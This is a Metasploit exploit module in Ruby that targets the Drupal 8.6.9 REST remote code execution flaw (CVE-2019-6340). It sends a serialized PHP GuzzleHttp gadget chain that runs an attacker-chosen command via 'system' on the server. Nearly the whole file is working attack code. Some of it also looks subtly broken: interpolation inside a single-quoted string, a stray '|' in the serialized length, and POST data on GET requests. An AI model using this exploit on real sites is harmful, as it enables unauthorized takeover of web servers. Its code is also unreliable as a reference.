require 'json'
class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info, 
		'Name'=> 'Drupal <= 8.6.9 REST services RCE',
    		'Description'=> %q{ Drupal <= 8.6.9 REST services RCE},
    		'Authors'=> [
        		'Roberto Focke'
    		],
    		'DisclosureDate'=> '2019-03-04',
    		'License'=> 'MSF_LICENSE',
		'Platform' => 'php',
		'Arch' => ARCH_PHP,
		'Targets' => [['Drupal <= 8.6.9', {}]],
		'References'=> [
			[ 'CVE', '2019-6340'],
        		[ 'url', 'https://www.drupal.org/sa-core-2019-003'],
    			[ 'url', 'https://www.ambionics.io/blog/drupal8-rce'],
    			[ 'url', 'https://twitter.com/jcran/status/1099206271901798400'],
		        [ 'url', 'https://github.com/g0rx/Drupal-SA-CORE-2019-003/']
    			]
		
		))	
		register_options([
				OptString.new('TARGETURI', [true, 'The base path', '/'])
				], self.class)
	end
    	
		

	def exploit
		href_url=normalize_uri(target_uri.path,"/rest/type/shortcut/default")
		$i=1
		cmd=payload.encode
		payload2= '{"link": [
		{
                "value": "link",
                "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"
                           "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""
                           "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"
                           "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
                           "s:|#{cmd.length.to_s}:\"#{cmd}\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"
                           "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"
                           "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""
                           "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                           ""
        		    }
   	     	],
        	"_links": {
            	"type": {
                	"href": "#{href_url}"}
            		}
        	}
	    }'.to_json
    
		booltest = false
		while $i < 100 and !booltest do
		
			resp=send_request_cgi(
					'method' => 'GET',
					'uri'    => normalize_uri(target_uri.path,"/node/#{$i.to_s}"),
					)
			$i=$i+1
		
		if	resp.headers['X-Drupal-Cache'] == 'HIT'
			booltest = true
		end
		
		send_request_cgi(
      			'method' => 'GET',
      			'uri'    => normalize_uri(target_uri.path,"/node/#{$i.to_s}"),
      			'ctype'  => "application/hal+json",
      			'vars_post' => {
					'json' => payload2
				        })
	end
end
end
